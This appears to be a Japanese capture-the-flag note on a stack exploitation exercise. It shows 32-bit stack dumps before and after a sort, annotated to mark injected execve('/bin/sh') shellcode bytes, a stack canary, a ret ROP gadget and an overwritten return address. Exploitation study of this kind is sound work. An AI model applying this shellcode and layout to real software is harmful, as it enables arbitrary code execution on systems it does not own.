sort前のスタック
0xffa22828:     0x00000000      0xff820d84      0x00000000      0xff820d84
0xffa22838:     0x00000000      0xff820d84      0x00000000      0xff820d84
0xffa22848:     0x00000000      0xff820d84      0x00000000      0xc0490000  ←-50
0xffa22858:     0x00000000      0xff820d84      0x00000000      0xff820d84
     ↑
  同じ値()が続く
　　　↓
0xffa229d8:     0x00000000      0xff820d84      0x00000000      0xff820d84
0xffa229e8:     0x00000000      0xff820d84      0x00000000      0x08000000
0xffa229f8:     0xe1f7c931      0x9101eb51      0x732f2f68      0x90909068  ←shellcode
0xffa22a08:     0x69622f68      0x9090406e      0x0bb0e389      0x900080cd
0xffa22a18:     0xffa22a00      0x08049010      0x00000000      0x0804900a  ←0ｘ8049010ではなく左の0xffa22a00がshellcodeの先頭 
												　                          ←0x804900a(retのropgdget これを8049841に)
0xffa22a28:     0xffa22a48      0x052eea00      0x0804c000      0xf7ebd000  ←左側がカナリア 右はベースアドレス 
0xffa22a38:     0xffa22a48      0x08049841      0xffa22a60      0x00000000  ←リターンアドレス(0x8049841)
0xffa22a48:     0x00000000      0xf7ceced5      0xf7ebd000      0xf7ebd000


sort後のスタック

0xffa22828:     0x00000000      0xff820d84      0x00000000      0xff820d84
          |
0xffa229d8:     0x00000000      0xff820d84      0x00000000      0xff820d84
0xffa229e8:     0x0804c000      0xf7ebd000      0x00000000      0xf7ceced5
0xffa229f8:     0x00000000      0xc0490000      0xe1f7c931      0x9101eb51
0xffa22a08:     0x732f2f68      0x90909068      0x69622f68      0x9090406e
0xffa22a18:     0x0bb0e389      0x900080cd      0xffa22a60      0x00000000
0xffa22a28:     0xffa22a48      0x052eea00      0x00000000      0x08000000
0xffa22a38:     0x00000000      0x0804900a      0xffa22a00      0x08049010 ←狙い通りの位置にgadgetが来ている
0xffa22a48:     0xffa22a48      0x08049841      0xf7ebd000      0xf7ebd000